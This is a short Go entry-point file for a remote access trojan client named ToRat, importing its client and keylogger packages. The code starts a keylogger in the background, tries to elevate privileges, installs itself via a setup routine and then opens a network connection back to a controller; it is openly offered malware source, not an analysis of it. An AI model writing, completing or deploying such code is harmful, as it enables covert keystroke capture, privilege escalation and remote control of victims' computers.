package main

import (
	"os"

	"github.com/lu4p/ToRat_client/client"
	"github.com/lu4p/ToRat_client/keylogger"
)

func main() {
	go keylogger.StartLogger()
	for {
		if client.CheckSetup() {
			break
		}
		if client.CheckElevate() {
			client.Setup()
			break
		}
		if client.Elevate() == nil {
			os.Exit(0)
		}
		client.Setup()
		break

	}
	client.NetClient()
}
